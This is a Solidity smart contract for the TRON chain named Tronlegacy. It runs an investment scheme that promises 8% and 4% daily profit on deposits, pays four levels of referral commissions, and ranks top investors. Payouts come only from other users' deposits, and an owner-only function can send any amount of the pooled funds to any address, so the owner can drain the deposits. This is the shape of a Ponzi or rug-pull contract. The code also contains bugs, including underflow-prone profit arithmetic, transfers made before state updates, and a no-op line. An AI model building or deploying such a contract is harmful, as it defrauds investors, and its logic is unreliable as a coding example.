//SourceUnit: Tronlegacy.sol

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.7.0;
// pragma experimental ABIEncoderV2;


/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public owner;
   
    event OwnershipRenounced(address indexed previousOwner);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        _transferOwnership(_newOwner);
    }

    /**
     * @dev Transfers control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function _transferOwnership(address _newOwner) internal {
        require(_newOwner != address(0));
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}


contract Tronlegacy is Ownable{

    
    uint256 overall_invested;
    struct User{
        bool user_added;
        uint256 acc_balance;
        bool referred;
        address referred_by;
        uint256 total_invested_amount;
        uint256 total_profit_amount;
        uint256 referal_profit;
        uint256 referal_profit_withdrawn;
        string panels;
    }
    struct Panel_1{
        uint256 invested_amount;
        uint256 profit;
        uint256 profit_withdrawn;
        uint256 start_time;
        bool time_started;
        uint256 days_count;
        bool panel1;
    }
    struct Panel_2{
        uint256 invested_amount2;
        uint256 profit2;
        uint256 profit_withdrawn2;
        uint256 start_time2;
        bool time_started2;
        uint256 days_count2;
        bool panel2;
    }
    struct Referal_levels{
        uint256 level_1;
        uint256 level_2;
        uint256 level_3;
        uint256 level_4;
        
    }
    mapping(address => User) public user_info;
    mapping(address => Panel_1) public panel_1;
    mapping(address => Panel_2) public panel_2;
    mapping(address => Referal_levels) public refer_info;
    
    
    mapping(uint8 => address) public top_10_investors;
    
    
    function top_10() public{
        for(uint8 i=0; i<10; i++){
            if(top_10_investors[i] == msg.sender){
                for(uint8 j=i ; j<11;j++){
                    top_10_investors[j] = top_10_investors[j+1];
                }
            }
        }
        for(uint8 i=0;i<10;i++){
            if(user_info[top_10_investors[i]].total_invested_amount < user_info[msg.sender].total_invested_amount){

                for(uint8 j = 10;j > i;j--){
                    top_10_investors[j] = top_10_investors[j-1];
                }
                top_10_investors[i] = msg.sender;
                return;
            }
        }
    }
    
    
 
    function invest_panel1() public payable {
        require(msg.value>=50000000, 'Please Enter Amount no less than 50');
        panel_1[msg.sender].invested_amount = msg.value+panel_1[msg.sender].invested_amount;
        panel_1[msg.sender].panel1 = true;
        overall_invested = overall_invested + msg.value;
        user_account_info();
        referral_system(msg.value);
        top_10();
        if(panel_1[msg.sender].time_started == false){
            panel_1[msg.sender].start_time = now;
            panel_1[msg.sender].time_started = true;
        }
    }

    function panel1_days() private  returns(uint256){
        if(panel_1[msg.sender].time_started == true){
        panel_1[msg.sender].days_count = ((now - panel_1[msg.sender].start_time)/(60*60*24)) ; //change 20 to 60*60*24
        }else{
            panel_1[msg.sender].days_count = 0;    
        }
        return panel_1[msg.sender].days_count;
    }
    
    function panel1_profit() private  {
        panel_1[msg.sender].profit = ((panel_1[msg.sender].invested_amount*8*(panel1_days()))/100)- (panel_1[msg.sender].profit_withdrawn);
    }


    function withdraw_profit_panel1(uint256 amount) public {
        panel1_profit();
        require( panel_1[msg.sender].profit > amount , 'Withdraw is higher than profit');
        msg.sender.transfer(amount);
        panel_1[msg.sender].profit_withdrawn = panel_1[msg.sender].profit_withdrawn + amount;
        panel1_profit();
        user_account_info();
    }
    function withdraw_all_panel1() public payable {
        panel1_profit();
        uint256 a = panel1_days();
        //change 5 to 30 
        require(( ((a/30>0) && (a%30<4)) ), 'You can withdraw months-months');
        msg.sender.transfer((panel_1[msg.sender].invested_amount) + (panel_1[msg.sender].profit));
        overall_invested = overall_invested - panel_1[msg.sender].invested_amount;
        panel_1[msg.sender].profit_withdrawn = (panel_1[msg.sender].invested_amount) + (panel_1[msg.sender].profit) + panel_1[msg.sender].profit_withdrawn;
        panel_1[msg.sender].invested_amount = 0;
        panel_1[msg.sender].profit = 0;
        panel_1[msg.sender].start_time = 0;
        panel_1[msg.sender].days_count;
        panel_1[msg.sender].panel1 = false;
    
    }
    
    
    function panel2_invest() public payable {
        require(msg.value>=50000000, 'Please Enter Amount no less than 50');
        panel_2[msg.sender].invested_amount2 = msg.value+panel_2[msg.sender].invested_amount2;
        panel_2[msg.sender].panel2 = true;
        overall_invested = overall_invested + msg.value;
        user_account_info();
        referral_system(msg.value);
        top_10();
        if(panel_2[msg.sender].time_started2 == false){
            panel_2[msg.sender].start_time2 = now;
            panel_2[msg.sender].time_started2 = true;
        }
    }
    function panel2_days() private  returns(uint256){
        if(panel_2[msg.sender].time_started2 == true){
        panel_2[msg.sender].days_count2 = ((now - panel_2[msg.sender].start_time2)/(60*60*24)) ; //change 20 to 60*60*24
        }else{
            panel_2[msg.sender].days_count2 = 0;    
        }
        return panel_2[msg.sender].days_count2;
    }
    
    function panel2_profit() private  returns(uint256){
        panel_2[msg.sender].profit2 = ((panel_2[msg.sender].invested_amount2*4*(panel2_days()))/100)- (panel_2[msg.sender].profit_withdrawn2);
        
    }
    function withdraw_profit_panel2(uint256 amount) public {
        panel2_profit();
        require(panel_2[msg.sender].profit2 > amount, 'Withdraw is higher than profit');
        msg.sender.transfer(amount);
        panel_2[msg.sender].profit_withdrawn2 = panel_2[msg.sender].profit_withdrawn2 + amount;
        panel2_profit();
        user_account_info();
    }
    function panel1_update_info() private {
        panel1_days();
        panel1_profit();  
    }
    function panel2_update_info() private {
        panel2_days();
        panel2_profit();  
    }
    
    function panel_update_info() private {
     if(panel_1[msg.sender].panel1 == true){
         panel1_update_info();
     }
     if(panel_2[msg.sender].panel2 == true){
         panel2_update_info();
     }
    }
    
    function refer(address ref_add) public {
        require(user_info[msg.sender].referred == false, ' Already referred ');
        require(ref_add != msg.sender, ' You cannot refer yourself ');
        
        user_info[msg.sender].referred_by = ref_add;
        user_info[msg.sender].referred = true;        
        
        address level1 = user_info[msg.sender].referred_by;
        address level2 = user_info[level1].referred_by;
        address level3 = user_info[level2].referred_by;
        address level4 = user_info[level3].referred_by;
        
        if( (level1 != msg.sender) && (level1 != address(0)) ){
            refer_info[level1].level_1 += 1;
        }
        if( (level2 != msg.sender) && (level2 != address(0)) ){
            refer_info[level2].level_2 += 1;
        }
        if( (level3 != msg.sender) && (level3 != address(0)) ){
            refer_info[level3].level_3 += 1;
        }
        if( (level4 != msg.sender) && (level4 != address(0)) ){
            refer_info[level4].level_4 += 1;
        }
        user_account_info();
        
    }
    function referal_withdraw(uint256 amount) public {
        require( user_info[msg.sender].referal_profit >= amount, 'Withdraw must be less than Profit');
        user_info[msg.sender].referal_profit_withdrawn = user_info[msg.sender].referal_profit_withdrawn + amount;
        user_info[msg.sender].referal_profit = user_info[msg.sender].referal_profit - amount;
        msg.sender.transfer(amount);
        user_account_info();
    }

     function referral_system(uint256 amount) private {
        address level1 = user_info[msg.sender].referred_by;
        address level2 = user_info[level1].referred_by;
        address level3 = user_info[level2].referred_by;
        address level4 = user_info[level3].referred_by;

        if( (level1 != msg.sender) && (level1 != address(0)) ){
            user_info[level1].referal_profit += (amount*7)/(100);
        }
        if( (level2 != msg.sender) && (level2 != address(0)) ){
            user_info[level2].referal_profit += (amount*3)/(100);
        }
        if( (level3 != msg.sender) && (level3 != address(0)) ){
            user_info[level3].referal_profit += (amount*1)/(100);
        }
        if( (level4 != msg.sender) && (level4 != address(0)) ){
            user_info[level4].referal_profit += (amount*1)/(100);
        }
    }   

    function user_account_info() public {
        panel_update_info();
        user_info[msg.sender].acc_balance = panel_1[msg.sender].invested_amount + panel_2[msg.sender].invested_amount2 + panel_1[msg.sender].profit + panel_2[msg.sender].profit2;
        user_info[msg.sender].total_invested_amount = panel_1[msg.sender].invested_amount + panel_2[msg.sender].invested_amount2;
        user_info[msg.sender].total_profit_amount = panel_1[msg.sender].profit + panel_2[msg.sender].profit2;
        if((panel_1[msg.sender].panel1 == true) && (panel_2[msg.sender].panel2 == true)){
            user_info[msg.sender].panels = 'panel 1 , panel 2';
        }else if(panel_1[msg.sender].panel1 == true){
            user_info[msg.sender].panels = 'panel 1';
        }else if(panel_2[msg.sender].panel2 == true){
            user_info[msg.sender].panels = 'panel 2';
        }
    }
    
     function SendTRXFromContract(address payable _address, uint256 _amount) public payable onlyOwner returns (bool){
        require(_address != address(0), "error for transfer from the zero address");
        _address.transfer(_amount);
        return true;
    }
   
    function SendTRXToContract() public payable returns (bool){
        return true;
    }
    
        function get_acc_balance() public view returns(uint256){
            return user_info[msg.sender].acc_balance;
        }
        function get_total_invested_amount() public view returns(uint256){
            return user_info[msg.sender].total_invested_amount;
        }
        function get_total_profit_amount() public view returns(uint256){
            return user_info[msg.sender].total_profit_amount;
        }
        function get_referal_profit() public view returns(uint256){
            return user_info[msg.sender].referal_profit;
        }
        function get_panel_1_invested_amount() public view returns(uint256){
            return panel_1[msg.sender].invested_amount;
        }
        function get_panel_2_invested_amount() public view returns(uint256){
            return panel_2[msg.sender].invested_amount2;
        }
        function get_panel_1_days_count() public view returns(uint256){
            return panel_1[msg.sender].days_count;
        }
        function get_panel_2_days_count() public view returns(uint256){
            return panel_2[msg.sender].days_count2;
        }
        function get_panel_1_profit()public view returns(uint256){
            return panel_1[msg.sender].profit;
        }
        function get_panel_2_profit()public view returns(uint256){
            return panel_2[msg.sender].profit2;
        }
        function get_user_total_invested_amount(address add) public view returns(uint256){
            return user_info[add].total_invested_amount;
        }
        function get_overall_invested() public view returns(uint256){
            return overall_invested;
        }
        function get_referred() public view returns(bool){
            return user_info[msg.sender].referred;
        }
        function get_referred_by() public view returns(address){
            return user_info[msg.sender].referred_by;
        }
        function get_refer_level_1() public view returns(uint256){
            return refer_info[msg.sender].level_1;
        }
        function get_refer_level_2() public view returns(uint256){
            return refer_info[msg.sender].level_2;
        }
        function get_refer_level_3() public view returns(uint256){
            return refer_info[msg.sender].level_3;
        }
        function get_refer_level_4() public view returns(uint256){
            return refer_info[msg.sender].level_4;
        }

}